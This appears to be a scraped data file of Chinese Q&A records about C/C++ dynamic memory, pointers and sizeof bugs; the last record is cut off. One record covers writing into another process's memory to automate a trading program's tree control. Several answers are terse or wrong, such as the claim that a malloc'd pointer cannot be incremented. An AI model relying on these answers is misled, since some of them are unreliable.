{"Answer": "&lt;p&gt;你好&amp;#xff0c;你的程序出现的问题在你给每个字符串赋值的版块&amp;#xff0c;你以为pcolor&amp;#43;i可以到下一个新的字符串&amp;#xff0c;其实它表达的是你上一个字符串去掉第一个字母&amp;#xff0c;所以你每一次的输入是在第一次输入的基础上的重叠覆盖&amp;#xff01;为了具体了解&amp;#xff0c;你可以先写一个字符串char pcolor&amp;#61;“red”&amp;#xff0c;然后输出pcolor&amp;#43;1&amp;#xff0c;你会发现输出的是ed&amp;#xff0c;也就是pcolor[1]和pcolor[2]。那么如何更正呢&amp;#xff1f;我建议使用结构去包含字符串。具体可以关注私信我&amp;#xff0c;我们一起交流讨论。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C用动态内存+指针数组实现字符串从小到大排序，求指出错误", ["#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "#", "include", "<string.h>", "\n\n", "void", " ", "sort", "(", "char", " *pc,", "int", " m)", ";\n\n", "int", " ", "main", "(", "void", ")", "\n", "{\n    ", "int", " i=", "0", ";\n    ", "int", " n;\n    ", "int", " x;\n    ", "char", " *pcolor;\n    \n    ", "printf", "(", "\"输入n个字符串：\\n\"", ");\n    ", "scanf", "(", "\"%d\"", ",&n);\n     \n    ", "if", "((pcolor=(", "char", " *)", "malloc", "(n*", "sizeof", "(", "char", ")))==", "NULL", ")\n    {\n        ", "printf", "(", "\"不能分配内存！\\n\"", ");\n        ", "exit", "(", "1", ");\n    }\n    \n    ", "for", "(i=", "0", ";i<n;i++)\n    {\n        ", "scanf", "(", "\"%s\"", ",pcolor+i);\n    }\n    \n    \n    ", "sort", "(pcolor,n);\n    \n    \n    ", "for", "(i=", "0", ";i<n;i++)\n    {\n        ", "printf", "(", "\"%s\\n\"", ",pcolor+i);\n    }\n    \n    ", "free", "(pcolor);\n    \n    ", "return", " ", "0", ";\n}\n\n", "void", " ", "sort", "(", "char", " *pc,", "int", " m)", "\n", "{\n    ", "int", " j=", "0", ",k=", "0", ";\n    ", "char", " *temp;\n    \n    ", "for", "(j=", "1", ";j<m;j++)\n    {\n        ", "for", "(k=", "0", ";k<m-j;k++)\n        {\n            ", "if", "(", "strcmp", "(pc+k,pc+k+", "1", ")>", "0", ")\n            {\n                temp=pc+k;\n                pc=pc+", "1", ";\n                pc=temp-k", "-1", ";\n            }\n        }\n    }\n}\n", "\n", "结果是这样的，不知道错在哪了，求指点", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;已解决&amp;#xff0c;基础知识不足的原因&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c 关于union结构指针内存释放问题", ["\n", "typedef struct tuple_ {\n    struct tuple_ *next;\n    enum TUPLE_FLAGS flags;\n\n    Packet *p;\n    int  dir;     // server or client\n    enum TCP_STATE state;\n    uint32_t server_ip; // 用来判断数据包是服务器发的包还是客户端发的包\n\n    unsigned long cs;  // create tuple time\n    unsigned long expires; // 到期时间，释放掉\n    unsigned long last_communicate; // 最近通信时间\n\n    pthread_mutex_t mutex;\n\n    union {\n        struct http_context *http;\n        struct email_context *email;\n        //TODO ftp smb\n    };\n\n}", "\n\n", "我在程序中使用tuple->http=calloc(1, sizeof(struct http_context))申请内存，然后释放free(tuple->http)却出现了下面错误：", "\n\n", "double free or corruption (out): 0x00007f3af0000920 ***", "\n\n", " ", "\n\n", "如果我把struct http_context *http; 定义放在union外面，就没问题。这是什么原因呢？哪位大佬能解释其中的yuan'l"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你第一次插入的时候&amp;#xff0c;i就大于了L.length&amp;#xff0c;不直接返回ERROR了吗&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["线性表插入操作，查错问题", ["该线性表插入操作未报错，但是不能插入数据，程序运行没问题", "\n", "#include<stdio.h>", "\n", "#include<stdlib.h>", "\n\n", "#define TRUE 1", "\n", "#define FALSE 0", "\n", "#define OK 1", "\n", "#define ERROR 0", "\ntypedef ", "int", " Status;\n\n", "//", "动态存储方式\n", "#define LIST_INIT_SIZE 100", "\n", "#define LIST_INCREMENT 10", "\ntypedef ", "int", " ElemType;\ntypedef struct {\n    ElemType *elem;", "//", "存储空间地址\n    ", "int", " ", "length", ";", "//", "当前长度\n    ", "int", " listsize;", "//", "当前分配的存储容量\n} SqList;\n\nStatus InitList_S", "q(SqList &L)", " {\n    L.elem = (ElemType*)malloc(LIST_INIT_SIZE);\n    ", "if", " (!L.elem)", "return", " ERROR;\n    L.length = ", "0", ";\n    L.listsize = LIST_INIT_SIZE;\n    ", "return", " OK;\n}\n\nStatus ListInsert_S", "q(SqList &L, int i, ElemType e)", " {\n    ElemType *p;\n    ", "if", " (i < ", "1", " || i > L.length)\n        ", "return", " ERROR;\n    ", "if", " (L.length >= L.listsize) {\n        ElemType *newbace = (ElemType*)realloc(L.elem, (L.listsize + LIST_INCREMENT) * sizeof(ElemType));\n        ", "if", " (!newbace)\n            ", "return", " ERROR;\n        L.elem = newbace;\n        L.listsize += LIST_INCREMENT;\n    }\n    ElemType *", "q", " = &(L.elem[i - ", "1", "]);\n    ", "for", " (p = &(L.elem[L.length - ", "1", "]); p >= ", "q", "; --p) {\n        *(p + ", "1", ") = *p; ", "//", "元素后移\n    }\n    *", "q", " = e;\n    ++L.length;\n    ", "return", " OK;\n}\n\nvoid disList(SqList L) {\n    ", "for", " (", "int", " i = ", "1", "; i <= L.length; i++) {\n        ", "printf", "(", "\"%d \"", ", L.elem[i - ", "1", "]);\n    }\n    ", "printf", "(", "\"\\n\"", ");\n}\n\n", "int", " main() {\n    ", "int", " a[", "8", "] = {", "1", ", ", "2", ", ", "3", ", ", "4", ", ", "5", ", ", "100", ", ", "200", ", ", "300", "};\n    ", "int", " i, j, e = ", "586", ";\n    SqList List;\n    InitList_S", "q(List)", ";\n    ", "for", " (i = ", "1", ", j = ", "0", "; i <= ", "8", "; i++, j++)\n        ListInsert_S", "q(List, i, a[j])", ";\n    ", "printf", "(", "\"\\n初始元素序列\\n\"", ");\n    disList(List);\n    ListInsert_S", "q(List, 3, e)", ";\n    ", "printf", "(", "\"\\n插入e元素后的元素序列\\n\"", ");\n    disList(List);\n    ", "return", " ", "0", ";\n}\n", "\n", "上图是运行结果，刚学，不懂为啥这样，知道原因的朋友欢迎指错，感谢您。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/216665363066135.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;br /&gt;编译器用x86指针是4字节&amp;#xff0c;如果是用的64&amp;#xff0c;那指针的字节数就是8。&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["多态原理中虚函数内存大小", ["问题遇到的现象和发生背景", "\n", "多态原理：父类中创建一个虚函数 szieof父类为何运行结果和VS命令提示符中的结果不一样", "\n", "问题相关代码，请勿粘贴截图", "\n", "#", "include", "<iostream>", "\n", "#", "include", "<string>", "\n", "using", " ", "namespace", " std;\n\n", "class", " ", "Animal", "\n{\n", "public", ":\n\n    ", "virtual", " ", "void", " ", "speak", "()", "\n    ", "{\n        cout << ", "\"动物在说话\"", " << endl;\n    }\n};\n\n", "class", " ", "Cat", " :", "public", " Animal\n{\n", "public", ":\n    ", "void", " ", "speak", "()", "\n    ", "{\n    cout << ", "\"小猫在说话\"", " << endl;\n    }\n};\n\n", "class", " ", "Dog", " :", "public", " Animal\n{\n", "public", ":\n\n    ", "void", " ", "speak", "()", "\n    ", "{\n        cout << ", "\"小狗在说话\"", " << endl;\n    }\n\n};\n\n\n", "void", " ", "DoSpeak", "(Animal& animal)", "\n", "{\n    animal.", "speak", "();\n}\n\n", "void", " ", "test01", "()", "\n", "{\n    Cat cat;\n    ", "DoSpeak", "(cat);\n\n\n    Dog dog;\n    ", "DoSpeak", "(dog);\n}\n\n", "void", " ", "test02", "()", "\n", "{\n    cout << ", "\"sizeof Animal = \"", " << ", "sizeof", "(Animal) << endl;\n}\n", "int", " ", "main", "()", " ", "{\n\n    ", "test02", "();\n\n    ", "system", "(", "\"pause\"", ");\n\n    ", "return", " ", "0", ";\n}\n\n", "\n", "运行结果及报错内容", "\n", "\n", "我想要达到的结果", "\n", "运行后的结果不是也应该为4吗 因为只有一个指针存放在里面"]], "Tag": "程序设计"}
{"Answer": "关于为什么不用释放内存\r\n程序在运行完 操作系统会自动回收你的内存 对于小程序可以不用写delete\r\n但是大程序不释放会造成内存不足\r\n一般new 和 delete还是配对使用比较好  养成好习惯", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++中如何正确使用new", ["PF* p=new PF[(np1+np2)*sizeof(PF)];", "\n\n", "\n", "\n\n", "为什么可以不用delete来释放内存？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;重复释放内存了。Pop的参数不是引用类型&amp;#xff0c;S &amp;#61; S-&amp;gt;next;这句不能让指针实参改变&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这里不能释放掉内存", ["\n", "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef struct stack *Stack;\ntypedef struct stack\n{\n    int data;\n    Stack next;\n} stack;\n\nStack InitStack(Stack S)\n{\n    S = (Stack)malloc(sizeof(stack));\n    S->next = NULL;\n    S->data = 0;\n    return S;\n}\nStack Push(Stack S, int data)\n{\n\n    if  (S->next == NULL && S->data == 0) // 如果是头节点\n    {\n        S->data = data;\n        return S;\n    }\n    Stack s = (Stack)malloc(sizeof(stack)); \n    s->next = S;\n    s->data = data;\n    return s;\n}\nint Pop(Stack S) \n{\n    int temp = S->data;\n    Stack p = S;\n    S = S->next;           \n    free(p);\n    p = NULL;\n    return temp;\n}\n    int a = Pop(S);\n    int b = Pop(S);\n    S = Push(S,Operation(a,b,c));"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;命名空间没有引用吧。cout这些命令需要引用name space std。或者用std.cout&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++6提示错误简单的", ["\n\n```c++\n", "#", "include", "<iostream.h>", "\n", "void", " main()\n{\n", "int", " x=", "123", ";\n", "double", " y=", "456.123", ";\ncout<<", "\"int所占字节\"", "<<", "sizeof", "(", "int", ")<<endl;\ncout<<", "\"double所占字节\"", "<<", "sizeof", "(", "double", ")<<endl;\n}\n\n", "\n", "```"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;e里面什么值被清除&amp;#xff1f;修改了下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-xml\"&gt;typedef struct{\n        &lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; a[&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;];\n}triplet;\n\nstatus inittriplet(triplet *&amp;amp;&lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;,&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; v1,&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; v2,&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; v3)\n{\n    &lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;&amp;#61;(triplet *)malloc(sizeof(triplet));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(!&lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;) &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ERROR;\n    &lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;-&amp;gt;a[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]&amp;#61;v1;\n    &lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;-&amp;gt;a[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;]&amp;#61;v2;\n    &lt;span class=\"hljs-built_in\"&gt;e&lt;/span&gt;-&amp;gt;a[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;]&amp;#61;v3;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; OK;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这个函数调用后e中的值会被清除，明明使用了动态内存分配", ["typedef struct{", "   int a[3];", "}triplet;", "status inittriplet(triplet", "e,int v1,int v2,int v3)", "{", "    e=(triplet", ")malloc(sizeof(triplet));", "    if(!e) return ERROR;", "    e->a[0]=v1;", "    e->a[1]=v2;", "    e->a[2]=v3;", "    return OK;", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;参数用二级指针&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言动态内存分配问题，Linux平台问题", ["Linux平台，好像动态内存分配的函数不好使了，无法给链表头节点初始化", "\n", "typedef ", "struct", " LinkList\n{\n  ", "char", " data;\n  ", "struct", " LinkList* next;\n}Node,*LinkList;\n", "//初始化单链表,创建一个头指针与一个头结点", "\nStatus ", "InitList(LinkList ", "l", ")", "\n{\n  l =(Node*)calloc(", "1", ",sizeof(Node));", "//头结点", "\n  l->next = NULL;", "//初始化头结点", "\n  l->data = ", "0", ";\n  return OK;\n}\nElemtype ", "InsertList(LinkList ", "l", ",Elemtype ", "e", ",", "int", " ", "i", ")", "//在第i个元素之前插入", "\n{\n   ", "if", "(i<", "0", " || ", "i>", "Length(", "l", ")", "+", "1", ")\n       return ", "0", ";\n    Node* ", "new", " =(Node*)malloc(sizeof(Node));", "//新节点", "\n   ", "while", "(--i)\n     l = l->next;\n   ", "new", "->data = e;", "//节点值", "\n   ", "new", "->next = l->next;\n   l->next = ", "new", ";\n   l->data++;\n   return e;\n}\n\nStatus ", "Create_tail(LinkList ", "l", ",Elemtype", "*", " ", "e", ",", "int", " ", "i", ")", "\n{\n  ", "if", "(!", "Empty(", "l", ")", ")\n      return ERROR;\n  ", "int", " j = ", "0", ";\n  ", "while", "(i - j)\n  {\n    ", "InsertList(", "l", ",", "*", "(", "e", "+", "j", ")", ",l->data+", "1", ");\n    ++j;\n  }\n  return OK;\n}\n\n", "int", " main", "()", "\n{\n    ", "int", " i = ", "0", ";\n    Elemtype a", "[", "10", "]", ",e;\n  LinkList h;\n  ", "InitList(", "h", ")", ";\n  scanf(", "\"%s\"", ",a);\n  ", "Create_tail(", "h", ",", "a", ",", "strlen", "(", "a", ")", ");\n  ", "DispList(", "h", ")", ";\n  printf(", "\"%d\\n\"", ",", "Length(", "h", ")", ");\n  ", "if", "(", "Empty(", "h", ")", ")\n      printf(", "\"此链表为空\\n\"", ");\n  ", "else", "\n      printf(", "\"此链表不为空\\n\"", ");\n  ", "GetElem(", "h", ",3,&", "e", ")", ";\n  printf(", "\"%c\\n\"", ",e);\n  ", "LocateElem(", "h", ",'V')", ";\n  ", "InsertList(", "h", ",'D',7)", ";\n  ", "DispList(", "h", ")", ";\n  ", "DeleList(", "h", ",&", "e", ",1)", ";\n  ", "DispList(", "h", ")", ";\n  ", "DestoryList(", "h", ")", ";\n  return ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;TreeNode的定义呢&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["二叉树非递归遍历内存不对齐", ["问题遇到的现象和发生背景", "\n", "leetcode144 非递归遍历二叉数", "发生member access within misaligned address错误", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "struct", " ", "stack", " {\n    ", "struct", " ", "TreeNode", "* root;\n    ", "struct", " ", "stack", "* next;\n};\n\n", "//在cur后面添加栈元素", "\n", "void", " ", "push_back", "(", "struct", " TreeNode* root, ", "struct", " stack* cur)", " ", "{\n    ", "struct", " ", "stack", "* nextNode = (", "struct", " stack*)", "malloc", "(", "sizeof", "(", "struct", " stack));\n    nextNode->root = root;\n    nextNode->next = ", "NULL", ";\n    cur->next = nextNode;\n    cur = cur->next;\n}\n", "void", " ", "popTop", "(", "struct", " stack* shead)", " ", "{\n    ", "struct", " ", "stack", "* slow = shead;\n    ", "struct", " ", "stack", "* fast = slow->next;\n    ", "if", " (!fast) ", "return", ";\n    ", "while", " (fast->next)\n    {\n        slow = slow->next;\n        fast = fast->next;\n    }\n    ", "free", "(fast);\n    slow->next = ", "NULL", ";\n}\n\n\n", "int", "* ", "preorderTraversal", "(", "struct", " TreeNode* root, ", "int", "* returnSize)", " ", "{\n    ", "int", " ret[", "1000", "];\n    ", "int", " retIndex = ", "0", ";\n    ", "struct", " ", "stack", "* shead = (", "struct", " stack*)", "malloc", "(", "sizeof", "(", "struct", " stack));\n    shead->next = ", "NULL", ";\n    ", "struct", " ", "stack", "* cur = shead;\n    ", "int", " stackTop = ", "0", ";\n    *returnSize = ", "0", ";\n\n    ", "if", " (!root) ", "return", " ret;\n\n    ", "push_back", "(root, cur);\n\n    ", "//当栈不为空时", "\n    ", "while", " (shead->next)\n    {\n        ", "struct", " ", "TreeNode", "* node = cur->root;\n        ret[retIndex++] = node->val;\n        ", "popTop", "(shead);\n        ", "if", " (node->right) ", "push_back", "(node->right, cur);\n        ", "if", " (node->left) ", "push_back", "(node->left, cur);\n    }\n\n    *returnSize = retIndex;\n    ", "return", " ret;\n}\n\n", "\n", "运行结果及报错内容", "\n", "\n", "实在是找不到问题出在哪里"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为 double* p&amp;#61;(double*)malloc(sizeof(double)*n);  定义了一个数组 p[n] , p 是数组名&amp;#xff0c;是个常量。&lt;br /&gt;当 scanf(&amp;#34;%lf&amp;#34;,p&amp;#43;i);  时&amp;#xff0c; p &amp;#43; i 为&amp;#xff1a; p &amp;#43; 偏移量 即 常量 &amp;#43; 偏移量 &amp;#61; 相对的地址。&lt;br /&gt;改成scanf(&amp;#34;%lf&amp;#34;,p);p&amp;#43;&amp;#43;&amp;#xff1b; p&amp;#43;&amp;#43; 自增&amp;#xff0c;改变常量的值是不被允许的。但如果再定义一个指针如 double *q &amp;#61; p; 然后用 q 来读取输入值&amp;#xff0c;q&amp;#43;&amp;#43;&amp;#xff1b;这是可以的。修改如下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;n);\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;* p&amp;#61;(&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)*n);\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; max,min,average;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; *q &amp;#61; p;    &lt;span class=\"hljs-comment\"&gt;//新定义一个指针q 指向 p&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;n;i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;,q);&lt;span class=\"hljs-comment\"&gt;//再利用q 来实现输入&lt;/span&gt;\n        q&amp;#43;&amp;#43;;\n        &lt;span class=\"hljs-comment\"&gt;//scanf(&amp;#34;%lf&amp;#34;,p&amp;#43;i);&lt;/span&gt;\n        &lt;span class=\"hljs-comment\"&gt;//p&amp;#43;&amp;#43;;&lt;/span&gt;\n    }\n    min&amp;#61;max&amp;#61;p[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;];\n    average&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;n;i&amp;#43;&amp;#43;)\n    {\n        average&amp;#43;&amp;#61;p[i];\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(max&amp;lt;p[i])\n        max&amp;#61;p[i];\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(min&amp;gt;p[i])\n        min&amp;#61;p[i];\n    }\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;average &amp;#61; %.2f\\nmax &amp;#61; %.2f\\nmin &amp;#61; %.2f&amp;#34;&lt;/span&gt;, average/n, max, min);\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(p);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["动态内存分配指针入门", ["\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "int", " ", "main", " ", "(", "void", ")", "\n", "{\n    ", "int", " n;\n    ", "scanf", "(", "\"%d\"", ",&n);\n", "double", "* p=(", "double", "*)", "malloc", "(", "sizeof", "(", "double", ")*n);\n    ", "int", " i;\n    ", "double", " max,min,average;\n    \n        ", "for", "(i=", "0", ";i<n;i++)\n    {\n        ", "scanf", "(", "\"%lf\"", ",p+i);\n        ", "//p++; ", "\n    }\n    min=max=p[", "0", "];\n    average=", "0", ";\n    ", "for", "(i=", "0", ";i<n;i++)\n    {\n        average+=p[i];\n        ", "if", "(max<p[i])\n        max=p[i];\n        ", "if", "(min>p[i])\n        min=p[i];\n    }\n    ", "printf", "(", "\"average = %.2f\\nmax = %.2f\\nmin = %.2f\"", ", average/n, max, min);\n    ", "free", "(p); \n}\n", "\n", "为什么第一个for循环读入的时候p+i可以读进去，而改成scanf(\"%lf\",p);p++；就不行了呢\n    "]], "Tag": "程序设计"}
{"Answer": "打开进程\n申请内存\n填充结构\n发送消息 sendmessage TVM_HITTEST，0，内存地址\n读取内存\n这样就可以跨进程操作了 ，我目前只做到遍历节点信息和坐标，获取节点状态还不会，如果你研究出来了告诉我下", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["跨进程控制SysTreeView32树状图控件的难题", ["最近公司在做一个智能化股票交易的项目，需要控制股票交易软件树状图进行翻页，刚开始我使用普通的WM_LBUTTONDOWN和WM_LBUTTONUP消息进行发送，发现只是实现了选择树状图节点，而没有达到实际效果，也就是控制页面跳转，遂怀疑是WM_NCHITTEST的问题，可是加入了WM_NCHITTEST消息，并把截获的消息全部依次发送后，仍无法成功。\n后来发现在WM_LBUTTONUP消息后，有一个关键的TVM_HITTEST我没有进行处理，此时得知这个SysTreeView32的触发事件并不是ItemSelected，而是在鼠标点击时通过HitTest获取点击的节点，再触发下一步动作。\nTVM_HITTEST消息向树状图发送了一个地址，这个地址指向一个TV_HITTESTINFO结构数据：\npublic struct TV_HITTESTINFO\n{\n    public POINTAPI pt;\n    public int flags;\n    public UInt32 hItem;\n}\n实际情况下发送的数据是这样的：\n![](http://113.11.198.136:82/FileStore/1.jpg)\n如果仅仅使用普通的鼠标模拟消息发送过去，pt的坐标值均为负数，显然达不到效果。可是我用WriteProcessMemory将有效的坐标值和节点句柄写入这个地址再发送过去发现，TVM_HITTEST消息中的pt坐标值会瞬间变为负值，仍然失败。如果新申请一个内存进行写入，结果相同。\n![](http://113.11.198.136:82/FileStore/2.jpg)\n\n以下是用spy++截获的关键消息：\n![](http://113.11.198.136:82/FileStore/3.jpg)\n\n以下是模拟点击的代码，其中一些十六进制数值已根据实际数值进行替换\nclass Test\n{\n\n    private int Handle, MainHandle, PID;\n\n    public Test(int handle, int mainHandle, int pid)\n    {\n        this.Handle = handle; this.MainHandle = mainHandle; this.PID = pid;\n        pHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, PID);\n    }\n\n    public void SelectTreeItem()\n    {\n        int rtn;\n        //windows鼠标消息\n        rtn = SendMessage(Handle, WM_NCHITTEST, 0x0, 0xAB0068);  //0xAB0068是屏幕鼠标的坐标\n        rtn = SendMessage(Handle, WM_MOUSEACTIVATE, MainHandle, 0x2010001);\n        rtn = SendMessage(Handle, WM_SETCURSOR, Handle, 0x2010001);\n        //左键按下\n        rtn = PostMessage(Handle, WM_LBUTTONDOWN, 0x1, 0x9001D);  //0x9001D是树状图内鼠标点击的相对坐标\n        //刷新树状图\n        rtn = SendMessage(Handle, WM_GETDLGCODE, 0x0, 0x0);\n        rtn = PostMessage(Handle, WM_PAINT, 0x0, 0x0);\n        //左键弹起\n        rtn = PostMessage(Handle, WM_LBUTTONUP, 0x0, 0x9001D);  //0x9001D是树状图内鼠标点击的相对坐标\n        //改变节点\n        rtn = SendMessage(Handle, WM_CAPTURECHANGED, 0x0, 0x0);\n        //HitTest欺骗\n        Hittest();\n        rtn = SendMessage(Handle, TVM_HITTEST, 0x0, 0x18F2AC);  //0x18F2AC储存TV_HITTESTINFO结构数据\n        //选择节点\n        rtn = SendMessage(Handle, TVM_SELECTITEM, 0x9, 0x661770); //0x661770是目标节点的句柄(根据实际情况更改)\n        rtn = SendMessage(Handle, WM_NCHITTEST, 0x0, 0xAB0068);\n    }\n\n    private void Hittest()\n    {\n        TV_HITTESTINFO NewItem = default(TV_HITTESTINFO);\n        NewItem.pt = new POINTAPI(29, 9);\n        NewItem.flags = TVHT_ONITEM | TVHT_ONITEMRIGHT | TVHT_BELOW | TVHT_TORIGHT | TVHT_TOLEFT | 0x77615080;\n        NewItem.hItem = 0xF4F25FD0;\n        WriteProcessMemory(pHandle, 0x18F2AC, NewItem, Marshal.SizeOf(typeof(TV_HITTESTINFO)), 0);\n    }\n\n}\n\n地址0x18F2AC也尝试过自行申请内存，结果同样。 无论怎么控制TV_HITTESTINFO数据，它的pt坐标总会变成负数。\n被这个问题困扰了很久，尝试过各种办法均告失败，请各位老师帮忙看看，还有没有成功的可能性。\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;上面定义的变量是 cions&lt;br /&gt;下面使用的变量是 coins&lt;br /&gt;i和o的位置写错了。拼写错误&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/016538714246154.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["结构体数组求占用的字符数求不了", ["问题遇到的现象和发生背景", "\n", "我想要用sizeof求一个结构体数组的大小，遇到一些问题", "\n", "问题相关代码，请勿粘贴截图", "\n", "struct", "\n{\n    ", "int", " amount;\n    ", "char", " *name;\n} cions[]={\n    {", "1", ",", "\"penny\"", "},\n    {", "5", ",", "\"nickel\"", "},\n    {", "10", ",", "\"dime\"", "},\n    {", "25", ",", "\"quarter\"", "},\n    {", "50", ",", "\"half-dollar\"", "}\n};\n", "int", " i;\n", "int", " k;\n", "scanf", "(", "\"%d\"", ",&k);\n", "for", "(i=", "0", ";i<", "sizeof", "(coins)/", "sizeof", "(coins[", "0", "]);i++)\n{\n    ", "if", "(cions[i].amount==k)\n    {\n        ", "printf", "(", "\"%s\"", ",coins[i].name);\n    }\n}\n\n", "\n", "运行结果及报错内容", "\n", "[Error] 'coins' undeclared (first use in this function)"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;函数&amp;#xff1a;int Initlist_L(LinkList &amp;amp;l) 形参加上地址引用即可 。&lt;br /&gt;第58行&amp;#xff1a;};  多了 ‘ ; &amp;#39;号&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["学生党，有没有耐心的看一下，为什么每次从 Initlist_L 函数出来之后 l 的内存都会被释放，导致遍历函数出错？", ["typedef", " ", "int", " ElemType;\n\n\n\n\n\n", "typedef", " ", "struct", " ", "Node", "{       \n    ElemType data;        \n    ", "struct", " ", "Node", "* next;     \n}Node,*LinkList;      \n\n\n", "int", " ", "main", "(", "int", " argc, ", "const", " ", "char", " * argv[])", " ", "{\n    LinkList l = ", "NULL", ";\n    \n    ", "if", "( !", "Initlist_L", "( l ) ){\n        ", "PrintList_L", "( l );      ", "//遍历链表元素", "\n    }", "else", " {\n        ", "printf", "( ", "\"分配内存失败.\"", " );\n    }\n}\n\n", "int", " ", 